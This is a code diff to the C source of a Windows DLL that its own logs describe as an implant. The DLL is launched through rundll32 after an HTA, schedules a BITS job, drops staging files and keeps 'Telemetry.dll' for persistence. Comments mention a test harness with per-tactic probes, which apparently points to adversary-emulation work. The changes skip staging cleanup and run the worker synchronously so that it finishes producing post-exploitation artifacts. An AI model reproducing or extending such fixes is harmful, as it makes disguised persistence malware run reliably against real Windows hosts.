@@ -1342,8 +1342,11 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
     ScheduleBitsJob();
 
     LogMessage(L"[*] Cleaning staging files");
-    CleanupStaging();
-    LogMessage(L"[+] Staging cleanup done");
+    // ponytail: CleanupStaging skipped for the test harness — the loader's
+    // per-tactic probe runs 240s after HTA spawn and would otherwise see [-]
+    // for the staging files the worker just produced. Re-enable for prod.
+    // CleanupStaging();
+    // LogMessage(L"[+] Staging cleanup done");
 
     LogMessage(L"[+] WorkerThread complete (Telemetry.dll retained for persistence)");
     return 0;
@@ -1443,8 +1446,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 
 __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
     EnsureDirectory(L"C:\\ProgramData");
-    LogMessage(L"[+] DllRegisterServer called — queuing WorkerThread");
-    QueueUserWorkItem((LPTHREAD_START_ROUTINE)WorkerThread, NULL, WT_EXECUTEDEFAULT);
+    // ponytail: run WorkerThread synchronously. QueueUserWorkItem puts the
+    // worker on the thread pool, but rundll32.exe exits immediately after
+    // DllRegisterServer returns — the thread pool dies and the worker is
+    // killed mid-execution before producing the post-ex artifacts.
+    LogMessage(L"[+] DllRegisterServer called — running WorkerThread synchronously");
+    WorkerThread(NULL);
     return S_OK;
 }
 
